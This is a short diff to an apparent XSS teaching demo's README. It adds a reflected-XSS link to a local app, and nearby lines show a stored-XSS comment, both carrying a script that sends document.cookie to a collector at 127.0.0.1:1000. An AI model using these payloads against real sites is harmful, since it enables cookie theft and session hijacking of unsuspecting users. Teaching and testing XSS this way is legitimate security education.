@@ -48,6 +48,8 @@ To delete the cookie:
 * Notice that the code is reflected inside the addressbar as a query.
 * When the user clicks on the link containing the address, their cookies from the vulnerable website can be stolen
 
+When given the link malicious link [here](http://localhost:5000/?q=%3Cscript+type%3D%27text%2Fjavascript%27%3Edocument.location%3D%27http%3A%2F%2F127.0.0.1%3A1000%2F%3Fc%3D%27%2Bdocument.cookie%3B%3C%2Fscript%3E) the user will automatically trigger the payload without himself noticing.
+
 ## Demonstration for Stored XSS
 ### WARNING, this will spam ping the server as the page is loading
 * Key in `<script type='text/javascript'>document.location='http://127.0.0.1:1000/?c='+document.cookie;</script>` into the comment blank
